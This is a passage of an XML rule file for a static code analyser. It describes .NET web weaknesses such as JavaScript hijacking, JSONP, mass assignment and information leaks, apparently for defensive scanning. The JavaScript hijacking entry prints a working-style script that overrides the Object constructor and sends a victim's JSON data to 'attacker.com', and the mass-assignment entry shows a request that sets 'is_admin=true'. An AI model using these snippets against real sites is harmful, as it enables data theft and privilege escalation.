							  Microsoft AJAX.NET (Atlas) uses JSON to transfer data between the server and the client. The framework produces responses comprised of valid JavaScript that can be evaluated using a <code>&lt;script&gt;</code> tag and is therefore vulnerable to JavaScript hijacking [1]. By default, the framework use the POST method to submit requests, which makes it difficult to generate a request from a malicious <code>&lt;script&gt;</code> tag (since <code>&lt;script&gt;</code> tags only generate GET requests). However, Microsoft AJAX.NET does provide mechanisms for using GET requests. In fact, many experts encourage programmers to use GET requests in order to leverage browser caching and improve performance.<br>An application or framework may be vulnerable to JavaScript hijacking if it:<br>      - Uses JavaScript as a data transfer format<br>      - Handles confidential data<br>Web browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a Web page, both the JavaScript and the Web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker.<br>JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a Web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional Web applications are not.<br>The most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax . JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.<br><b>Example 1:</b> The following example begins by showing a legitimate JSON interaction between the client and server components of a Web application that is used to manage sales leads. It goes on to show how an attacker can mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.<br>The client requests data from a server and evaluates the result as JSON with the following code:<br><pre><br>var object;<br>var req = new XMLHttpRequest();<br>req.open("GET", "/object.json",true);<br>req.onreadystatechange = function () {<br>  if (req.readyState == 4) {<br>    var txt = req.responseText;<br>    object = eval("(" + txt + ")");<br>    req = null;<br>  }<br>};<br>req.send(null);<br></pre><br><br>When the code runs, it generates an HTTP request that looks like this:<br><pre><br>GET /object.json HTTP/1.1<br>...<br>Host: www.example.com<br>Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR<br></pre><br>(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)<br>The server responds with an array in JSON format:<br><pre><br>HTTP/1.1 200 OK<br>Cache-control: private<br>Content-Type: text/javascript; charset=utf-8<br>...<br>[{"fname":"Brian", "lname":"Chess", "phone":"6502135600",<br>  "purchases":60000.00, "email":"brian@fortifysoftware.com" },<br> {"fname":"Katrina", "lname":"O'Neil", "phone":"6502135600",<br>  "purchases":120000.00, "email":"katrina@fortifysoftware.com" },<br> {"fname":"Jacob", "lname":"West", "phone":"6502135600",<br>  "purchases":45000.00, "email":"jacob@fortifysoftware.com" }]<br></pre><br>In this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern Web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking.<br>If a victim can be tricked into visiting a Web page that contains the following malicious code, the victim's lead information will be sent to the attacker's Web site.<br><pre><br>&lt;script&gt;<br>// override the constructor used to create all objects so<br>// that whenever the "email" field is set, the method<br>// captureObject() will run. Since "email" is the final field,<br>// this will allow us to steal the whole object.<br>function Object() {<br> this.email setter = captureObject;<br>}<br><br>// Send the captured object back to the attacker's Web site<br>function captureObject(x) {<br>  var objString = "";<br>  for (fld in this) {<br>    objString += fld + ": " + this[fld] + ", ";<br>  }<br>  objString += "email: " + x;<br>  var req = new XMLHttpRequest();<br>  req.open("GET", "http://attacker.com?obj=" +<br>           escape(objString),true);<br>  req.send(null);<br>}<br>&lt;/script&gt;<br><br>&lt;!-- Use a script tag to bring in victim's data --&gt;<br>&lt;script src="http://www.example.com/object.json"&gt;&lt;/script&gt;<br></pre><br>The malicious code uses a script tag to include the JSON object in the current page. The Web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.<br>When the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead<br>Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both.<br>If the user is not logged into the vulnerable site, the attacker can compensate by asking the user to log in and then displaying the legitimate login page for the application. This is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack.<br>More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_javascript_hijacking_jsonp</key>
    <internalKey>Encapsulation/Javascript Hijacking/JSONP</internalKey>
    <name>Javascript Hijacking: JSONP</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <Paragraph>JSONP is an insecure communication technique and it should only be used when no personal or sensitive data is involved and sanitizing the callback function.</Paragraph>
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  By design JSONP allows to perform cross-domain requests but it lacks any mechanism to restrict and verify requests origins. A malicious site can easily perform a JSONP request in user's behalf and process the JSON response. For this reason, it is strongly recommended to avoid this communication technique when PII or sensitive data is being sent.<br>JSONP is by design a self-inflicted XSS attack since the callback function name needs to be reflected to the requesting site for proper JSON processing. It is mandatory to validate and sanitize the callback function name in order to avoid JavaScript injection. In order to sanitize the callback function name, consider a whitelist when possible or restrict the characters to be only alphanumeric.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_mass_assignment_sensitive_field_exposure</key>
    <internalKey>Encapsulation/Mass Assignment/Sensitive Field Exposure</internalKey>
    <name>Mass Assignment: Sensitive Field Exposure</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A sensitive field is exposed to the model binder.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Modern frameworks allow developers to automatically bind HTTP request parameters from both request query and body into model objects for ease of development and increase of productivity. If the binder is not correctly configured to control which HTTP request parameters are bound to which model attributes, an attacker may be able to abuse the model binding process and set any other attributes that should not be exposed to user control. This binding is possible even if the model attributes do not appear in the web forms or API contracts.<br><br><b>Example 1: </b> The following ASP.NET MVC controller method (<code>Register</code>) is accessed from a web form that asks the users to register an account by providing their name and password:<br><br><pre><br>public ActionResult Register(RegisterModel model)<br>{<br>    if (ModelState.IsValid)<br>    {<br>        try<br>        {<br>            return RedirectToAction("Index", "Home");<br>        }<br>        catch (MembershipCreateUserException e)<br>        {<br>            ModelState.AddModelError("", "");<br>        }<br>    }<br>    return View(model);<br>}<br></pre><br><br>Where <code>RegisterModel</code> class is defined as:<br><br><pre><br>public class RegisterModel<br>{<br>    [Required]<br>    [Display(Name = "User name")]<br>    public string UserName { get; set; }<br><br>    [Required]<br>    [DataType(DataType.Password)]<br>    [Display(Name = "Password")]<br>    public string Password { get; set; }<br><br>    [DataType(DataType.Password)]<br>    [Display(Name = "Confirm password")]<br>    public string ConfirmPassword { get; set; }<br><br>    public Details Details { get; set; }<br><br>    public RegisterModel()<br>    {<br>        Details = new Details();<br>    }<br>}<br></pre><br><br>and <code>Details</code> class is defined as:<br><br><pre><br>public class Details<br>{<br>    public Details()<br>    {<br>        IsAdmin = false;<br>    }<br>    public bool IsAdmin { get; set; }<br>    ...<br>}<br></pre><br><br>Given the above scenario, an attacker may be able to explore the application and discover that there is a <code>Details</code> attribute in the <code>RegisterModel</code> model. If this is the case, the attacker may then attempt to overwrite the current values assigned to their attributes.<br>If an attacker can find out these internal attributes, and the framework binder is not correctly configured in order to disallow binding of these attributes, then the attacker would be able to register an administrator account by sending the following request:<br><br><pre><br>name=John&amp;password=****&amp;details.is_admin=true<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 915</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] OWASP <em>Mass assignment</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_poor_logging_practice_use_of_a_system_output_stream</key>
    <internalKey>Encapsulation/Poor Logging Practice/Use of a System Output Stream</internalKey>
    <name>Poor Logging Practice: Use of a System Output Stream</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using <code>Console.Out</code> or <code>Console.Error</code> rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  <b>Example 1:</b> The first .NET program that a developer learns to write often looks like this:<br><br><pre><br>public class MyClass {<br>  public static void Main(string[] args) {<br>    Console.WriteLine("hello world");<br>  }<br>}<br></pre><br><br>While most programmers go on to learn many nuances and subtleties about .NET, a surprising number hang on to this first lesson and never give up on writing messages to standard output using <code>Console.WriteLine()</code>.<br><br>The problem is that writing directly to standard output or standard error is often used as an unstructured form of logging. Structured logging facilities provide features like logging levels, uniform formatting, a logger identifier, timestamps, and, perhaps most critically, the ability to direct the log messages to the right place. When the use of system output streams is jumbled together with the code that uses loggers properly, the result is often a well-kept log that is missing critical information.<br><br>Developers widely accept the need for structured logging, but many continue to use system output streams in their "pre-production" development. If the code you are reviewing is past the initial phases of development, use of <code>Console.WriteLine</code> may indicate an oversight in the move to a structured logging system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_silverlight_misconfiguration_overly_permissive_cross_domain_policy</key>
    <internalKey>Encapsulation/Silverlight Misconfiguration/Overly Permissive Cross-Domain Policy</internalKey>
    <name>Silverlight Misconfiguration: Overly Permissive Cross-Domain Policy</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The configuration file on the service host defines an overly permissive cross-domain policy.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  <br>          By default, Silverlight applications are subject to the Same-Origin Policy which ensures that a Silverlight application can access data on a service only if they come from the same domain. Silverlight allows developers to alter the policy via appropriate settings in the <code>clientaccesspolicy.xml</code> configuration file on the host. However, caution should be taken when changing the settings because an overly permissive cross-domain policy will allow a malicious applications to communicate with the victim service in an inappropriate way, leading to spoofing, data theft, relay and other attacks.<br><br><b>Example 1:</b> Below is an example <code>clientaccesspolicy.xml</code> using a wildcard to declaratively specify applications domains that are allowed to communicate with the service.<br><br><pre><br>&lt;allow-from http-request-headers="*"&gt;<br>	&lt;domain uri="*"/&gt;<br>&lt;/allow-from&gt;<br></pre><br><br>Using the <code>*</code> as the value of the <code>domain</code> element's <code>uri</code> attribute indicates that applications on any domain can connect to the service.<br>        
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[3]  <em>HTTP Communication and Security with Silverlight: Cross-Domain Communication</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[5]  <em>Network Security Access Restrictions in Silverlight</em> <br></p>
																									   <p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[8]  <em>URL Access Restrictions in Silverlight</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_system_information_leak</key>
    <internalKey>Encapsulation/System Information Leak</internalKey>
    <name>System Information Leak</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An information leak occurs when system data or debugging information leaves the program through an output stream or logging function.<br><br><b>Example:</b> The following code constructs a database connection string, uses it to create a new connection to the database, and prints it to the console.<br><br><pre><br>string cs="database=northwind;server=mySQLServer...";<br>SqlConnection conn=new SqlConnection(cs);<br>...<br>Console.Writeline(cs);<br></pre><br><br>Depending on the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_system_information_leak_external</key>
    <internalKey>Encapsulation/System Information Leak/External</internalKey>
    <name>System Information Leak: External</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.<br><br><b>Example:</b> The following code leaks Exception information in the HTTP response:<br><br><pre><br>try<br>{<br>  ...<br>}<br>catch (Exception e)<br>{<br>  Response.Write(e.ToString());<br>}<br></pre><br><br>This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_system_information_leak_internal</key>
    <internalKey>Encapsulation/System Information Leak/Internal</internalKey>
    <name>System Information Leak: Internal</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging.<br><br><b>Example:</b> The following code constructs a database connection string, uses it to create a new connection to the database, and prints it to the console.<br><br><pre><br>string cs="database=northwind;server=mySQLServer...";<br>SqlConnection conn=new SqlConnection(cs);<br>...<br>Console.Writeline(cs);<br></pre><br><br>Depending on the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_system_information_leak_signalr_exposed_javascript_proxy</key>
    <internalKey>Encapsulation/System Information Leak/SignalR Exposed JavaScript Proxy</internalKey>
    <name>System Information Leak: SignalR Exposed JavaScript Proxy</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <Paragraph>Automatically generated JavaScript proxy files can leak system information as they list all the exposed methods in the Hubs</Paragraph>
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If you do not want to include all of the hubs and methods in the JavaScript proxy file for each user, you can disable the automatic generation of the file. You might choose this option if you have multiple hubs and methods, but do not want every user to be aware of all of the methods.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12]  <em>Introduction to SignalR Security </em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_trust_boundary_violation</key>
    <internalKey>Encapsulation/Trust Boundary Violation</internalKey>
    <name>Trust Boundary Violation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Commingling trusted and untrusted data in the same data structure encourages programmers to mistakenly trust unvalidated data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary--to move from untrusted to trusted.<br><br>A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. The most common way to make this mistake is to allow trusted and untrusted data to commingle in the same data structure.<br><br><b>Example:</b> The following C# code accepts an HTTP request and stores the <code>usrname</code> parameter in the HTTP session object before checking to ensure that the user has been authenticated.<br><br><pre><br>usrname = request.Item("usrname");<br>if (session.Item(ATTR_USR) == null) {<br>    session.Add(ATTR_USR, usrname);<br>}<br></pre><br><br>Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 501</em> <br></p>
